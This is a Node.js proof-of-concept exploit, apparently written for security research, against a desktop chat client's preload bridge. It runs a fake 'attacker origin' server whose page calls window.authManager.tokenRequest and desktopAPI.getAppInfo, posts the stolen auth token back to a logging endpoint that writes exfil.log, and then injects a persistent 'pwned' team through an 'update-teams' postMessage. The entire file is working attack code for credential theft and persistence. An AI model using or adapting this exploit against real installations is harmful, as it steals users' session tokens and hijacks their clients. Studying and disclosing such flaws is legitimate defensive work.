// Foreign origin 127.0.0.2:8098 — any non-kChat web origin reached by a top-level navigation in a server view.
const http = require('http'); const fs = require('fs');
const PAGE = `<html><body>attacker origin<script>
(async () => {
  const out = {origin: location.origin, via: location.search, hasDesktopAPI: typeof window.desktopAPI, hasAuthManager: typeof window.authManager};
  try { out.appInfo = await window.desktopAPI.getAppInfo(); } catch (e) { out.appInfoErr = String(e); }
  try { out.token = await window.authManager.tokenRequest(); } catch (e) { out.tokenErr = String(e); }
  await fetch('/log', {method: 'POST', body: JSON.stringify(out)});
  // Second step (persistence check): the page posts a same-origin 'update-teams' message to itself; the preload forwards it to main (UPDATE_TEAMS).
  if (location.search.includes('persist')) {
    window.postMessage({type: 'update-teams', message: {teams: [{display_name: 'pwned', url: 'http://127.0.0.2:8098', id: 'x'}]}}, location.origin);
  }
})();
</script></body></html>`;
http.createServer((req, res) => {
  if (req.url === '/log') { let b=''; req.on('data', c => b += c); req.on('end', () => { fs.appendFileSync('exfil.log', b + '\n'); console.log('[attacker] EXFIL: ' + b); res.end('ok'); }); return; }
  console.log('[attacker] ' + req.method + ' ' + req.url + ' auth=' + (req.headers.authorization || '-'));
  res.setHeader('Content-Type', 'text/html'); res.end(PAGE);
}).listen(8098, '127.0.0.2', () => console.log('[attacker] listening 127.0.0.2:8098'));
